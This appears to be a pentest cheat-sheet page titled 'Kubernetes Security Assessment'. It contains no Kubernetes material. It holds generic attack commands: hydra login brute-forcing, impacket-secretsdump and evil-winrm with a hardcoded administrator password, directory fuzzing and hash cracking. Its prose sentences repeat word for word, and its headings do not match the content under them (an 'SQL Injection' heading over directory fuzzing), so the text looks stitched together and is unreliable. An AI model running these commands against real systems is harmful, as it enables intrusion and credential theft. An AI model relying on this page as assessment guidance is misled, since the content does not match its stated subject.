---
TitleSEO: "Kubernetes Security Assessment | ZureFX"
TitlePost: "Kubernetes Security Assessment"
Author: "ZureFX"
Description: "Personal notes on Kubernetes Security Assessment. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, persistence, windows"
URL: "https://zurefx.github.io/notes/note-kubernetes-security-assessment-211.html"
URL_IMAGES: ""
Date: "2024-11-05"
Tags: "Cheatsheet, Persistence, Windows"
Section: "notes"
Lang: "en"
main_img: "note-kubernetes-security-assessment-211"
Permalink: "/notes/note-kubernetes-security-assessment-211.html"
BtnLabel: "Read Notes"
Pick: 0
---
## PostgreSQL

### SQL Injection

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.215.62/FUZZ
gobuster dir -u http://10.17.29.188/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

> **Note:** Pass the Ticket was identified as the primary attack vector in this scenario.

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

## PowerShell

### Pass the Ticket

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.165.119
nmap -sCV -p21,23,3306 10.83.54.125 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.105.156.137 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.82.160.39/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.199.70 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.47.107
```

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.159.161 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.161.142
```

## Unquoted Service Path

### psexec

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.56.83.46 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
evil-winrm -i 10.74.169.110 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.
